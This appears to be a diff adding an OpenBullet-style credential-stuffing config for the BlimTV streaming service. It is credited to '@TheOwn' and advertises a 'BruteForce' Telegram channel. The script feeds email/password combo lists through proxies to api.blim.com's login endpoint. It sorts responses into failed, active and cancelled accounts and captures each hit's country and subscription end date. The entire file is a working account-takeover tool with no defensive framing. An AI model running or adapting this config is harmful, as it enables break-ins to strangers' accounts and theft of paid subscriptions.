@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "BlimTV",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-14T00:55:35.3091633+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | CPM Rate: 100-500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://api.blim.com/account/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":\"false\",\"clientId\":\"3\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: type/TABLET make/samsung model/SM-G925F uid/d0df9a5873137423 os/Android osVersion/19 blimVersion/2.2.35" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: api.blim.com" 
+
+#Key KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "que ingresaste son incorrectos" 
+    KEY "is not a valid local part for the email" 
+    KEY "The input is not a valid email address" 
+    KEY "Esta cuenta se encuentra en un estado no valido" 
+    KEY "Value is required and can't be empty" 
+    KEY "no es un correo v\\u00e1lido" 
+    KEY "Bad Request\",\"status\":400,\"detail\":\"JSON decoding error: Syntax error, malformed JSON" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"Active" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "status\":\"Missing Payment" 
+    KEY "status\":\"Cancelled" 
+
+#Country PARSE "<SOURCE>" JSON "countryIsoCode" -> CAP "Country" 
+
+#Subscription PARSE "<SOURCE>" JSON "subscriptionEnd" -> CAP "Subscription End at" 
+
+#CC FUNCTION Constant " T.me/BruteForce " -> CAP "Telegram Channel:" 
+
